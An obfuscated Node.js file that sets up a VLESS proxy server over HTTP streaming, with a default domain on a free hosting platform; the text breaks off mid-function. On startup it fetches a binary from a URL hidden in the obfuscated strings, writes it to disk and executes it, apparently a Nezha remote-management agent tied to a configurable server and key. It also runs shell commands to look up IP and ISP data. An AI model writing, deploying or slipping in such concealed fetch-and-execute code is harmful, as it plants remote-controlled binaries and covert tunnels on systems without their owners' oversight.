const _0x2ab542=_0x3484;(function(_0x58ea57,_0x21bc36){const _0x432925=_0x3484,_0x472521=_0x58ea57();while(!![]){try{const _0x95227c=parseInt(_0x432925(0x1cf))/0x1*(parseInt(_0x432925(0x2a3))/0x2)+-parseInt(_0x432925(0x230))/0x3+-parseInt(_0x432925(0x29c))/0x4*(parseInt(_0x432925(0x287))/0x5)+-parseInt(_0x432925(0x2a9))/0x6*(-parseInt(_0x432925(0x1cd))/0x7)+-parseInt(_0x432925(0x20f))/0x8+parseInt(_0x432925(0x25d))/0x9*(parseInt(_0x432925(0x1f4))/0xa)+parseInt(_0x432925(0x298))/0xb;if(_0x95227c===_0x21bc36)break;else _0x472521['push'](_0x472521['shift']());}catch(_0x4bf364){_0x472521['push'](_0x472521['shift']());}}}(_0x5d3d,0x21932));const os=require('os'),fs=require('fs'),net=require('net'),http=require(_0x2ab542(0x218)),axios=require(_0x2ab542(0x1e5)),{Buffer}=require('buffer'),{exec,execSync}=require('child_process'),UUID=process['env'][_0x2ab542(0x260)]||_0x2ab542(0x2a1),NEZHA_SERVER=process[_0x2ab542(0x1d2)][_0x2ab542(0x23f)]||'',NEZHA_PORT=process[_0x2ab542(0x1d2)][_0x2ab542(0x28a)]||'',NEZHA_KEY=process[_0x2ab542(0x1d2)][_0x2ab542(0x2b0)]||'',AUTO_ACCESS=process[_0x2ab542(0x1d2)][_0x2ab542(0x25a)]||![],XPATH=process[_0x2ab542(0x1d2)][_0x2ab542(0x21b)]||UUID[_0x2ab542(0x20d)](0x0,0x8),SUB_PATH=process['env'][_0x2ab542(0x249)]||_0x2ab542(0x22e),DOMAIN=process[_0x2ab542(0x1d2)]['DOMAIN']||'leapcell-harrywujy3462-w5bjcl19.apn.leapcell.dev',NAME=process[_0x2ab542(0x1d2)]['NAME']||_0x2ab542(0x229),PORT=process[_0x2ab542(0x1d2)]['PORT']||0xbb8,SETTINGS={[_0x2ab542(0x260)]:UUID,[_0x2ab542(0x253)]:_0x2ab542(0x2b3),[_0x2ab542(0x26b)]:'2048',[_0x2ab542(0x21b)]:_0x2ab542(0x271)+XPATH,[_0x2ab542(0x21c)]:0x1e,[_0x2ab542(0x288)]:0xf4240,[_0x2ab542(0x26d)]:0x7530,[_0x2ab542(0x1ea)]:0x400*0x400,[_0x2ab542(0x1f8)]:!![],['TCP_KEEPALIVE']:!![]};function validate_uuid(_0x6f0b1c,_0x13f6d2){for(let _0x14b89a=0x0;_0x14b89a<0x10;_0x14b89a++){if(_0x6f0b1c[_0x14b89a]!==_0x13f6d2[_0x14b89a])return![];}return!![];}function concat_typed_arrays(_0x2770d2,..._0x9a8834){const _0x57f6af=_0x2ab542;if(!_0x9a8834||_0x9a8834['length']<0x1)return _0x2770d2;let _0x1ac63e=_0x2770d2['length'];for(let _0x329ba2 of _0x9a8834)_0x1ac63e+=_0x329ba2[_0x57f6af(0x1f1)];const _0x32737f=new _0x2770d2[(_0x57f6af(0x1dc))](_0x1ac63e);_0x32737f[_0x57f6af(0x2a0)](_0x2770d2,0x0),_0x1ac63e=_0x2770d2[_0x57f6af(0x1f1)];for(let _0x5845d2 of _0x9a8834){_0x32737f['set'](_0x5845d2,_0x1ac63e),_0x1ac63e+=_0x5845d2['length'];}return _0x32737f;}function log(_0x2571df,..._0x1271cf){const _0x3f7817=_0x2ab542;if(SETTINGS[_0x3f7817(0x253)]===_0x3f7817(0x2b3))return;const _0x53ad3c={'debug':0x0,'info':0x1,'warn':0x2,'error':0x3},_0x3e3580={'debug':_0x3f7817(0x215),'info':_0x3f7817(0x255),'warn':'\x1b[33m','error':'\x1b[31m','reset':'\x1b[0m'},_0x47a62b=_0x53ad3c[SETTINGS['LOG_LEVEL']]||0x1,_0xdee3f6=_0x53ad3c[_0x2571df]||0x0;if(_0xdee3f6>=_0x47a62b){const _0x413672=new Date()[_0x3f7817(0x1fd)](),_0x897ac7=_0x3e3580[_0x2571df]||_0x3e3580[_0x3f7817(0x217)];console[_0x3f7817(0x289)](_0x897ac7+'['+_0x413672+']\x20['+_0x2571df+']',..._0x1271cf,_0x3e3580[_0x3f7817(0x217)]);}}function _0x3484(_0x3960f4,_0x5dcc69){const _0x5d3d9d=_0x5d3d();return _0x3484=function(_0x348497,_0x205865){_0x348497=_0x348497-0x1cb;let _0x5078a7=_0x5d3d9d[_0x348497];return _0x5078a7;},_0x3484(_0x3960f4,_0x5dcc69);}const getDownloadUrl=()=>{const _0x2c3795=_0x2ab542,_0x30fa07=os[_0x2c3795(0x282)]();return _0x30fa07===_0x2c3795(0x23e)||_0x30fa07===_0x2c3795(0x1e8)||_0x30fa07===_0x2c3795(0x290)?!NEZHA_PORT?_0x2c3795(0x236):_0x2c3795(0x1ff):!NEZHA_PORT?_0x2c3795(0x1e1):_0x2c3795(0x22f);},downloadFile=async()=>{const _0x26e423=_0x2ab542;if(!NEZHA_KEY)return;try{const _0x442eae=getDownloadUrl(),_0x47c986=await axios({'method':'get','url':_0x442eae,'responseType':_0x26e423(0x203)}),_0x5768b7=fs[_0x26e423(0x239)](_0x26e423(0x1d1));return _0x47c986[_0x26e423(0x24d)][_0x26e423(0x23b)](_0x5768b7),new Promise((_0x2ca979,_0x2ab8d5)=>{const _0x18991d=_0x26e423;_0x5768b7['on']('finish',()=>{const _0x478163=_0x3484;console['log'](_0x478163(0x21a)),exec(_0x478163(0x25f),_0x539217=>{if(_0x539217)_0x2ab8d5(_0x539217);_0x2ca979();});}),_0x5768b7['on'](_0x18991d(0x24f),_0x2ab8d5);});}catch(_0x17cfae){throw _0x17cfae;}},runnz=async()=>{const _0x4943ff=_0x2ab542;await downloadFile();let _0x782640='',_0x51dc54='';if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x58a3f0=['443','8443','2096',_0x4943ff(0x206),'2083','2053'];_0x782640=_0x58a3f0[_0x4943ff(0x224)](NEZHA_PORT)?_0x4943ff(0x2ab):'',_0x51dc54=_0x4943ff(0x1dd)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x782640+_0x4943ff(0x22c);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x146d54=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x4943ff(0x22d)](':')[_0x4943ff(0x259)]():'',_0x4e4445=new Set([_0x4943ff(0x219),_0x4943ff(0x25e),_0x4943ff(0x269),_0x4943ff(0x206),_0x4943ff(0x267),_0x4943ff(0x216)]),_0x5043a6=_0x4e4445[_0x4943ff(0x1e6)](_0x146d54)?_0x4943ff(0x241):_0x4943ff(0x1d5),_0x3c3627=_0x4943ff(0x26f)+NEZHA_KEY+_0x4943ff(0x263)+NEZHA_SERVER+_0x4943ff(0x26e)+_0x5043a6+_0x4943ff(0x270)+UUID;fs['writeFileSync']('config.yaml',_0x3c3627);}_0x51dc54=_0x4943ff(0x200);}else return;}try{exec(_0x51dc54,{'shell':_0x4943ff(0x275)}),console[_0x4943ff(0x289)](_0x4943ff(0x274));}catch(_0x2644db){console['error'](_0x4943ff(0x1f6)+_0x2644db);}};async function addAccessTask(){const _0x169f9f=_0x2ab542;if(AUTO_ACCESS!==!![])return;try{if(!DOMAIN)return;const _0x20f46f=_0x169f9f(0x20e)+DOMAIN,_0x531890=_0x169f9f(0x1f3)+_0x20f46f+_0x169f9f(0x286);exec(_0x531890,(_0x22c409,_0x27691e,_0x185c60)=>{const _0xcc822e=_0x169f9f;if(_0x22c409){console[_0xcc822e(0x24f)](_0xcc822e(0x2ad),_0x22c409[_0xcc822e(0x1d3)]);return;}console[_0xcc822e(0x289)](_0xcc822e(0x2a7),_0x27691e);});}catch(_0x3b94f9){console[_0x169f9f(0x24f)](_0x169f9f(0x26a),_0x3b94f9[_0x169f9f(0x1d3)]);}}function parse_uuid(_0x252961){const _0x232c2c=_0x2ab542;_0x252961=_0x252961['replaceAll']('-','');const _0x3aa664=[];for(let _0x3807e6=0x0;_0x3807e6<0x10;_0x3807e6++){_0x3aa664['push'](parseInt(_0x252961[_0x232c2c(0x291)](_0x3807e6*0x2,0x2),0x10));}return _0x3aa664;}async function read_vless_header(_0x2e201a,_0x1ef077){const _0x561be9=_0x2ab542;let _0x377650=0x0,_0xbbf3e6=new Uint8Array(),_0x5b2602={'value':_0xbbf3e6,'done':![]};async function _0x8fe40(_0x1a3127){const _0x1f8fd7=_0x3484;if(_0x5b2602['done'])throw new Error(_0x1f8fd7(0x28b));const _0x28c267=_0x1a3127-_0x377650;if(_0x28c267<0x1)return;_0x5b2602=await read_atleast(_0x2e201a,_0x28c267),_0x377650+=_0x5b2602['value'][_0x1f8fd7(0x1f1)],_0xbbf3e6=concat_typed_arrays(_0xbbf3e6,_0x5b2602['value']);}await _0x8fe40(0x1+0x10+0x1);const _0x9b5f4=_0xbbf3e6[0x0],_0x19cfe9=_0xbbf3e6['slice'](0x1,0x1+0x10),_0x1413ea=parse_uuid(_0x1ef077);if(!validate_uuid(_0x19cfe9,_0x1413ea))throw new Error(_0x561be9(0x234));const _0x492a56=_0xbbf3e6[0x1+0x10],_0x2d3763=0x1+0x10+0x1+_0x492a56+0x1+0x2+0x1;await _0x8fe40(_0x2d3763+0x1);const _0x52217c=_0xbbf3e6[0x1+0x10+0x1+_0x492a56],_0x46aeff=0x1;if(_0x52217c!==_0x46aeff)throw new Error(_0x561be9(0x24e)+_0x52217c);const _0x836303=(_0xbbf3e6[_0x2d3763-0x1-0x2]<<0x8)+_0xbbf3e6[_0x2d3763-0x1-0x1],_0x2a451a=_0xbbf3e6[_0x2d3763-0x1],_0x5a55d4=0x1,_0x414463=0x2,_0x5e6430=0x3;let _0x24a841=-0x1;if(_0x2a451a===_0x5a55d4)_0x24a841=_0x2d3763+0x4;else{if(_0x2a451a===_0x5e6430)_0x24a841=_0x2d3763+0x10;else _0x2a451a===_0x414463&&(_0x24a841=_0x2d3763+0x1+_0xbbf3e6[_0x2d3763]);}if(_0x24a841<0x0)throw new Error(_0x561be9(0x201));await _0x8fe40(_0x24a841);const _0x20c531=_0x2d3763;let _0x2905b7='';if(_0x2a451a===_0x5a55d4)_0x2905b7=_0xbbf3e6[_0x561be9(0x20d)](_0x20c531,_0x20c531+0x4)['join']('.');else{if(_0x2a451a===_0x414463)_0x2905b7=new TextDecoder()['decode'](_0xbbf3e6[_0x561be9(0x20d)](_0x20c531+0x1,_0x20c531+0x1+_0xbbf3e6[_0x20c531]));else _0x2a451a===_0x5e6430&&(_0x2905b7=_0xbbf3e6[_0x561be9(0x20d)](_0x20c531,_0x20c531+0x10)[_0x561be9(0x2b5)]((_0xc838b3,_0x38d30e,_0xc9b81b,_0x25ad38)=>_0xc9b81b%0x2?_0xc838b3['concat'](((_0x25ad38[_0xc9b81b-0x1]<<0x8)+_0x38d30e)['toString'](0x10)):_0xc838b3,[])[_0x561be9(0x257)](':'));}if(!_0x2905b7){log(_0x561be9(0x24f),_0x561be9(0x252));throw new Error(_0x561be9(0x210));}return log(_0x561be9(0x21d),'VLESS\x20connection\x20to\x20'+_0x2905b7+':'+_0x836303),{'hostname':_0x2905b7,'port':_0x836303,'data':_0xbbf3e6[_0x561be9(0x20d)](_0x24a841),'resp':new Uint8Array([_0x9b5f4,0x0])};}async function read_atleast(_0x2cebe1,_0x140eea){const _0x2c782c=_0x2ab542,_0x1ce3bd=[];let _0x423b33=![];while(_0x140eea>0x0&&!_0x423b33){const _0x574a1=await _0x2cebe1[_0x2c782c(0x250)]();if(_0x574a1['value']){const _0x539937=new Uint8Array(_0x574a1[_0x2c782c(0x202)]);_0x1ce3bd[_0x2c782c(0x264)](_0x539937),_0x140eea-=_0x539937[_0x2c782c(0x1f1)];}_0x423b33=_0x574a1[_0x2c782c(0x214)];}if(_0x140eea>0x0)throw new Error(_0x2c782c(0x28c));return{'value':concat_typed_arrays(..._0x1ce3bd),'done':_0x423b33};}async function parse_header(_0x2fedb0,_0x3c5ec6){const _0x5e036f=_0x2ab542;log(_0x5e036f(0x238),_0x5e036f(0x212));const _0x23f231=_0x3c5ec6[_0x5e036f(0x29b)]['getReader']();try{const _0x1c880e=await read_vless_header(_0x23f231,_0x2fedb0);return log('debug','VLESS\x20header\x20parsed\x20successfully'),_0x1c880e;}catch(_0x2d5df8){log('error',_0x5e036f(0x1ec)+_0x2d5df8[_0x5e036f(0x1d3)]);throw new Error(_0x5e036f(0x1e3)+_0x2d5df8['message']);}finally{_0x23f231[_0x5e036f(0x29a)]();}}async function connect_remote(_0x2901e9,_0x38906f){const _0x51c0c5=_0x2ab542,_0x533387=0x1f40;try{const _0x4bbfeb=await timed_connect(_0x2901e9,_0x38906f,_0x533387);return _0x4bbfeb[_0x51c0c5(0x20c)](!![]),_0x4bbfeb['setKeepAlive'](!![],0x3e8),_0x4bbfeb[_0x51c0c5(0x1ef)]=parseInt(SETTINGS['BUFFER_SIZE'])*0x400,log(_0x51c0c5(0x21d),_0x51c0c5(0x299)+_0x2901e9+':'+_0x38906f),_0x4bbfeb;}catch(_0x350d29){log(_0x51c0c5(0x24f),_0x51c0c5(0x24a)+_0x350d29[_0x51c0c5(0x1d3)]);throw _0x350d29;}}function timed_connect(_0x3af830,_0x3e7334,_0x381930){return new Promise((_0x2e570e,_0x2681c8)=>{const _0x25d99c=_0x3484,_0xacae04=net[_0x25d99c(0x208)]({'host':_0x3af830,'port':_0x3e7334}),_0x3a9797=setTimeout(()=>{const _0xf50879=_0x25d99c;_0x2681c8(new Error(_0xf50879(0x220)));},_0x381930);_0xacae04['on']('connect',()=>{clearTimeout(_0x3a9797),_0x2e570e(_0xacae04);}),_0xacae04['on'](_0x25d99c(0x24f),_0x13054e=>{clearTimeout(_0x3a9797),_0x2681c8(_0x13054e);});});}function pipe_relay(){async function _0x5bb531(_0x59697a,_0x5e5652,_0x3364bf){const _0x22b057=_0x3484,_0x2b3af3=parseInt(SETTINGS[_0x22b057(0x1ea)]);if(_0x3364bf[_0x22b057(0x1f1)]>0x0){if(_0x5e5652['write'])_0x5e5652['cork'](),_0x5e5652['write'](_0x3364bf),process[_0x22b057(0x1d4)](()=>_0x5e5652[_0x22b057(0x243)]());else{const _0x1f9b5b=_0x5e5652[_0x22b057(0x244)][_0x22b057(0x246)]();try{await _0x1f9b5b['write'](_0x3364bf);}finally{_0x1f9b5b['releaseLock']();}}}try{_0x59697a[_0x22b057(0x23b)]?(_0x59697a[_0x22b057(0x205)](),_0x59697a[_0x22b057(0x23b)](_0x5e5652,{'end':!![],'highWaterMark':_0x2b3af3}),_0x59697a[_0x22b057(0x23c)]()):await _0x59697a['readable'][_0x22b057(0x21f)](_0x5e5652[_0x22b057(0x244)],{'preventClose':![],'preventAbort':![],'preventCancel':![],'signal':AbortSignal[_0x22b057(0x2b1)](SETTINGS['SESSION_TIMEOUT'])});}catch(_0x414341){!_0x414341['message'][_0x22b057(0x224)](_0x22b057(0x262))&&log(_0x22b057(0x24f),_0x22b057(0x22a),_0x414341[_0x22b057(0x1d3)]);throw _0x414341;}}return _0x5bb531;}function socketToWebStream(_0x247af3){const _0x3cb75=_0x2ab542;let _0x5a600d,_0x3e41a2;return _0x247af3['on'](_0x3cb75(0x24f),_0x40be7d=>{const _0x116078=_0x3cb75;log('error',_0x116078(0x209),_0x40be7d[_0x116078(0x1d3)]),_0x5a600d?.[_0x116078(0x24f)](_0x40be7d),_0x3e41a2?.[_0x116078(0x24f)](_0x40be7d);}),{'readable':new ReadableStream({'start'(_0x5a7168){const _0x531795=_0x3cb75;_0x5a600d=_0x5a7168,_0x247af3['on'](_0x531795(0x24d),_0x302442=>{const _0x400a5c=_0x531795;try{_0x5a7168[_0x400a5c(0x1d7)](_0x302442);}catch(_0x42bf7a){log(_0x400a5c(0x24f),_0x400a5c(0x279),_0x42bf7a['message']);}}),_0x247af3['on'](_0x531795(0x1f7),()=>{const _0x8b222c=_0x531795;try{_0x5a7168[_0x8b222c(0x258)]();}catch(_0x2ea652){log(_0x8b222c(0x24f),_0x8b222c(0x213),_0x2ea652[_0x8b222c(0x1d3)]);}});},'cancel'(){const _0x11515b=_0x3cb75;_0x247af3[_0x11515b(0x1f2)]();}}),'writable':new WritableStream({'start'(_0x4d6c65){_0x3e41a2=_0x4d6c65;},'write'(_0x55efee){return new Promise((_0x47c4e1,_0xd499b7)=>{const _0x3ebe4c=_0x3484;if(_0x247af3['destroyed']){_0xd499b7(new Error(_0x3ebe4c(0x273)));return;}_0x247af3[_0x3ebe4c(0x27f)](_0x55efee,_0x385545=>{if(_0x385545)_0xd499b7(_0x385545);else _0x47c4e1();});});},'close'(){const _0x4d8859=_0x3cb75;!_0x247af3[_0x4d8859(0x293)]&&_0x247af3[_0x4d8859(0x1f7)]();},'abort'(_0x4ea51a){const _0x1b5fd8=_0x3cb75;_0x247af3[_0x1b5fd8(0x1f2)](_0x4ea51a);}})};}function relay(_0x22de93,_0x293b9c,_0x35d1b7,_0x43eee5){const _0x536233=_0x2ab542,_0x553a33=pipe_relay();let _0x1dc642=![];const _0x319ad9=socketToWebStream(_0x35d1b7);function _0x4f2878(){const _0x10ac49=_0x3484;if(!_0x1dc642){_0x1dc642=!![];try{_0x35d1b7[_0x10ac49(0x1f2)]();}catch(_0x206e2d){!_0x206e2d['message'][_0x10ac49(0x224)](_0x10ac49(0x262))&&!_0x206e2d[_0x10ac49(0x1d3)][_0x10ac49(0x224)]('socket\x20hang\x20up')&&log(_0x10ac49(0x24f),_0x10ac49(0x24b)+_0x206e2d[_0x10ac49(0x1d3)]);}}}const _0x35e1bb=_0x553a33(_0x293b9c,_0x319ad9,_0x43eee5[_0x536233(0x24d)])[_0x536233(0x2aa)](_0x5c32c4=>{const _0x2f94f9=_0x536233;!_0x5c32c4[_0x2f94f9(0x1d3)][_0x2f94f9(0x224)](_0x2f94f9(0x262))&&!_0x5c32c4[_0x2f94f9(0x1d3)][_0x2f94f9(0x224)](_0x2f94f9(0x25c))&&log(_0x2f94f9(0x24f),_0x2f94f9(0x24c)+_0x5c32c4[_0x2f94f9(0x1d3)]);})[_0x536233(0x28d)](()=>{const _0x26c0b3=_0x536233;_0x293b9c[_0x26c0b3(0x20a)]&&_0x293b9c[_0x26c0b3(0x20a)]();}),_0x456a54=_0x553a33(_0x319ad9,_0x293b9c,_0x43eee5[_0x536233(0x207)])[_0x536233(0x2aa)](_0x599947=>{const _0x17fe4e=_0x536233;!_0x599947[_0x17fe4e(0x1d3)][_0x17fe4e(0x224)](_0x17fe4e(0x262))&&!_0x599947['message'][_0x17fe4e(0x224)](_0x17fe4e(0x25c))&&log(_0x17fe4e(0x24f),'Download\x20error:\x20'+_0x599947['message']);});_0x456a54['finally'](()=>_0x35e1bb)[_0x536233(0x28d)](_0x4f2878);}const sessions=new Map();class Session{constructor(_0x511277){const _0xaf230c=_0x2ab542;this[_0xaf230c(0x1ee)]=_0x511277,this[_0xaf230c(0x223)]=0x0,this[_0xaf230c(0x256)]=![],this['lastActivity']=Date['now'](),this[_0xaf230c(0x232)]=null,this[_0xaf230c(0x242)]=null,this[_0xaf230c(0x23a)]=![],this[_0xaf230c(0x1db)]=null,this[_0xaf230c(0x1de)]=![],this['bufferedData']=new Map(),this['cleaned']=![],this['pendingPackets']=[],this[_0xaf230c(0x280)]=null,this[_0xaf230c(0x1e4)]=new Map(),log(_0xaf230c(0x238),_0xaf230c(0x251)+_0x511277);}async['initializeVLESS'](_0x2a09f2){const _0x2e285b=_0x2ab542;if(this['initialized'])return!![];try{log(_0x2e285b(0x238),_0x2e285b(0x1fc));const _0x42931f=new ReadableStream({'start'(_0x518089){const _0x2f2177=_0x2e285b;_0x518089[_0x2f2177(0x1d7)](_0x2a09f2),_0x518089[_0x2f2177(0x258)]();}}),_0x3f47e5={'readable':_0x42931f,'writable':new WritableStream()};return this[_0x2e285b(0x232)]=await parse_header(SETTINGS[_0x2e285b(0x260)],_0x3f47e5),log('info','VLESS\x20header\x20parsed:\x20'+this['vlessHeader'][_0x2e285b(0x277)]+':'+this['vlessHeader'][_0x2e285b(0x1eb)]),this[_0x2e285b(0x242)]=await connect_remote(this[_0x2e285b(0x232)][_0x2e285b(0x277)],this[_0x2e285b(0x232)]['port']),log('info',_0x2e285b(0x235)),this['initialized']=!![],!![];}catch(_0x269106){return log(_0x2e285b(0x24f),_0x2e285b(0x29e)+_0x269106[_0x2e285b(0x1d3)]),![];}}async['processPacket'](_0x4292b5,_0x5767f5){const _0x4c4a96=_0x2ab542;try{this['pendingBuffers'][_0x4c4a96(0x2a0)](_0x4292b5,_0x5767f5),log(_0x4c4a96(0x238),_0x4c4a96(0x27c)+_0x4292b5+',\x20size='+_0x5767f5['length']);while(this[_0x4c4a96(0x1e4)][_0x4c4a96(0x1e6)](this['nextSeq'])){const _0x5cb06b=this[_0x4c4a96(0x1e4)][_0x4c4a96(0x1e9)](this[_0x4c4a96(0x223)]);this[_0x4c4a96(0x1e4)][_0x4c4a96(0x28e)](this['nextSeq']);if(!this[_0x4c4a96(0x23a)]&&this[_0x4c4a96(0x223)]===0x0){if(!await this[_0x4c4a96(0x228)](_0x5cb06b))throw new Error('Failed\x20to\x20initialize\x20VLESS\x20connection');this[_0x4c4a96(0x1db)]=Buffer[_0x4c4a96(0x1fa)](this['vlessHeader'][_0x4c4a96(0x207)]),await this[_0x4c4a96(0x292)](this[_0x4c4a96(0x232)]['data']),this['currentStreamRes']&&this[_0x4c4a96(0x1d9)]();}else{if(!this['initialized']){log('warn',_0x4c4a96(0x296)+_0x4292b5+_0x4c4a96(0x29f));continue;}await this[_0x4c4a96(0x292)](_0x5cb06b);}this[_0x4c4a96(0x223)]++,log(_0x4c4a96(0x238),'Processed\x20packet\x20seq='+(this[_0x4c4a96(0x223)]-0x1));}if(this[_0x4c4a96(0x1e4)]['size']>SETTINGS[_0x4c4a96(0x21c)])throw new Error(_0x4c4a96(0x211));return!![];}catch(_0x137ae3){log('error',_0x4c4a96(0x2a5)+_0x137ae3[_0x4c4a96(0x1d3)]);throw _0x137ae3;}}[_0x2ab542(0x1d9)](){const _0x47f2bb=_0x2ab542;if(!this['currentStreamRes']||!this[_0x47f2bb(0x1db)])return;try{const _0x41bd8d=this[_0x47f2bb(0x280)][_0x47f2bb(0x2ac)]?.[_0x47f2bb(0x1ce)]||_0x47f2bb(0x221),_0x3a7335=_0x41bd8d==='h2';!this['headerSent']&&(log(_0x47f2bb(0x238),_0x47f2bb(0x1e2)+_0x41bd8d+_0x47f2bb(0x22b)+this[_0x47f2bb(0x1db)][_0x47f2bb(0x1f1)]+_0x47f2bb(0x226)),this[_0x47f2bb(0x280)][_0x47f2bb(0x27f)](this[_0x47f2bb(0x1db)]),this['headerSent']=!![]);if(_0x3a7335){this['currentStreamRes'][_0x47f2bb(0x2ac)][_0x47f2bb(0x20c)](!![]);const _0x3a4951=new require(_0x47f2bb(0x203))[_0x47f2bb(0x283)]({'transform'(_0x320af3,_0x39a2c7,_0x46590e){const _0x4255d4=_0x47f2bb,_0x43183c=0x4000;for(let _0x729267=0x0;_0x729267<_0x320af3[_0x4255d4(0x1f1)];_0x729267+=_0x43183c){this['push'](_0x320af3[_0x4255d4(0x20d)](_0x729267,_0x729267+_0x43183c));}_0x46590e();}});this['remote'][_0x47f2bb(0x23b)](_0x3a4951)[_0x47f2bb(0x23b)](this[_0x47f2bb(0x280)]);}else this['remote'][_0x47f2bb(0x23b)](this[_0x47f2bb(0x280)]);this['remote']['on'](_0x47f2bb(0x1f7),()=>{const _0x1a0bdf=_0x47f2bb;!this[_0x1a0bdf(0x280)]['writableEnded']&&this[_0x1a0bdf(0x280)][_0x1a0bdf(0x1f7)]();}),this['remote']['on'](_0x47f2bb(0x24f),_0x1a3dc2=>{const _0x2e438b=_0x47f2bb;log('error',_0x2e438b(0x1e0)+_0x1a3dc2[_0x2e438b(0x1d3)]),!this[_0x2e438b(0x280)][_0x2e438b(0x240)]&&this[_0x2e438b(0x280)][_0x2e438b(0x1f7)]();});}catch(_0x1519f8){log(_0x47f2bb(0x24f),_0x47f2bb(0x227)+_0x1519f8[_0x47f2bb(0x1d3)]),this[_0x47f2bb(0x2af)]();}}[_0x2ab542(0x237)](_0x2f4971,_0x429cb9){const _0x474f93=_0x2ab542;return!_0x2f4971[_0x474f93(0x2a2)]&&_0x2f4971['writeHead'](0xc8,_0x429cb9),this[_0x474f93(0x280)]=_0x2f4971,this[_0x474f93(0x23a)]&&this[_0x474f93(0x1db)]&&this[_0x474f93(0x1d9)](),_0x2f4971['on']('close',()=>{const _0xec7525=_0x474f93;log(_0xec7525(0x21d),'Client\x20connection\x20closed'),this[_0xec7525(0x2af)]();}),!![];}async[_0x2ab542(0x292)](_0x4f28e4){const _0x5a0eb2=_0x2ab542;if(!this['remote']||this[_0x5a0eb2(0x242)]['destroyed'])throw new Error(_0x5a0eb2(0x27e));return new Promise((_0x39a4c9,_0x2a0040)=>{this['remote']['write'](_0x4f28e4,_0x21c105=>{const _0xcf4eae=_0x3484;_0x21c105?(log(_0xcf4eae(0x24f),_0xcf4eae(0x278)+_0x21c105['message']),_0x2a0040(_0x21c105)):_0x39a4c9();});});}['_startDownstreamResponse'](){const _0x55a7bf=_0x2ab542;if(!this[_0x55a7bf(0x280)]||!this['responseHeader'])return;try{!this[_0x55a7bf(0x1de)]&&(this['currentStreamRes'][_0x55a7bf(0x27f)](this[_0x55a7bf(0x1db)]),this['headerSent']=!![]),this[_0x55a7bf(0x242)]['pipe'](this[_0x55a7bf(0x280)]),this[_0x55a7bf(0x242)]['on'](_0x55a7bf(0x1f7),()=>{const _0x2fe3fc=_0x55a7bf;!this[_0x2fe3fc(0x280)][_0x2fe3fc(0x240)]&&this[_0x2fe3fc(0x280)][_0x2fe3fc(0x1f7)]();}),this['remote']['on'](_0x55a7bf(0x24f),_0x530d1e=>{const _0x17c512=_0x55a7bf;log('error',_0x17c512(0x1e0)+_0x530d1e[_0x17c512(0x1d3)]),!this[_0x17c512(0x280)][_0x17c512(0x240)]&&this[_0x17c512(0x280)][_0x17c512(0x1f7)]();});}catch(_0x390ba4){log(_0x55a7bf(0x24f),_0x55a7bf(0x227)+_0x390ba4[_0x55a7bf(0x1d3)]),this['cleanup']();}}[_0x2ab542(0x2af)](){const _0x2b3d3f=_0x2ab542;!this[_0x2b3d3f(0x233)]&&(this[_0x2b3d3f(0x233)]=!![],log(_0x2b3d3f(0x238),_0x2b3d3f(0x268)+this[_0x2b3d3f(0x1ee)]),this[_0x2b3d3f(0x242)]&&(this[_0x2b3d3f(0x242)][_0x2b3d3f(0x1f2)](),this['remote']=null),this[_0x2b3d3f(0x23a)]=![],this['headerSent']=![]);}}const metaInfo=execSync(_0x2ab542(0x285),{'encoding':'utf-8'}),ISP=metaInfo['trim']();let IP=DOMAIN;if(!DOMAIN)try{IP=execSync(_0x2ab542(0x29d),{'encoding':_0x2ab542(0x20b)})[_0x2ab542(0x21e)]();}catch(_0x10ce28){try{IP='['+execSync(_0x2ab542(0x248),{'encoding':_0x2ab542(0x20b)})[_0x2ab542(0x21e)]()+']';}catch(_0x5972aa){log(_0x2ab542(0x24f),_0x2ab542(0x27b),_0x5972aa['message']),IP=_0x2ab542(0x1f9);}}const server=http[_0x2ab542(0x265)]((_0x2fb890,_0x330876)=>{const _0x26f7b2=_0x2ab542,_0x384e0b={'Access-Control-Allow-Origin':'*','Access-Control-Allow-Methods':'GET,\x20POST','Cache-Control':_0x26f7b2(0x261),'X-Accel-Buffering':'no','X-Padding':generatePadding(0x64,0x3e8)};if(_0x2fb890[_0x26f7b2(0x1fe)]==='/'){_0x330876[_0x26f7b2(0x27a)](0xc8,{'Content-Type':_0x26f7b2(0x1d8)}),_0x330876[_0x26f7b2(0x1f7)](_0x26f7b2(0x2a4));return;}if(_0x2fb890[_0x26f7b2(0x1fe)]==='/'+SUB_PATH){const _0x501fb1='vless://'+UUID+'@'+IP+':443?encryption=none&security=tls&sni='+IP+_0x26f7b2(0x2a6)+IP+_0x26f7b2(0x1cb)+SETTINGS[_0x26f7b2(0x21b)]+_0x26f7b2(0x231)+NAME+'-'+ISP,_0x391360=Buffer[_0x26f7b2(0x1fa)](_0x501fb1)['toString']('base64');_0x330876[_0x26f7b2(0x27a)](0xc8,{'Content-Type':_0x26f7b2(0x1d8)}),_0x330876[_0x26f7b2(0x1f7)](_0x391360+'\x0a');return;}const _0x152e74=_0x2fb890[_0x26f7b2(0x1fe)]['match'](new RegExp(XPATH+_0x26f7b2(0x276)));if(!_0x152e74){_0x330876[_0x26f7b2(0x27a)](0x194),_0x330876[_0x26f7b2(0x1f7)]();return;}const _0xe54ec=_0x152e74[0x1],_0x20a244=_0x152e74[0x2]?parseInt(_0x152e74[0x2]):null;if(_0x2fb890[_0x26f7b2(0x245)]===_0x26f7b2(0x2ae)&&!_0x20a244){_0x384e0b[_0x26f7b2(0x222)]=_0x26f7b2(0x1ed),_0x384e0b[_0x26f7b2(0x1f5)]='chunked';let _0x682005=sessions['get'](_0xe54ec);!_0x682005&&(_0x682005=new Session(_0xe54ec),sessions[_0x26f7b2(0x2a0)](_0xe54ec,_0x682005),log(_0x26f7b2(0x21d),_0x26f7b2(0x1e7)+_0xe54ec));_0x682005[_0x26f7b2(0x256)]=!![];!_0x682005['startDownstream'](_0x330876,_0x384e0b)&&(log(_0x26f7b2(0x24f),'Failed\x20to\x20start\x20downstream\x20for\x20session:\x20'+_0xe54ec),!_0x330876[_0x26f7b2(0x2a2)]&&(_0x330876[_0x26f7b2(0x27a)](0x1f4),_0x330876['end']()),_0x682005[_0x26f7b2(0x2af)](),sessions['delete'](_0xe54ec));return;}if(_0x2fb890['method']===_0x26f7b2(0x284)&&_0x20a244!==null){let 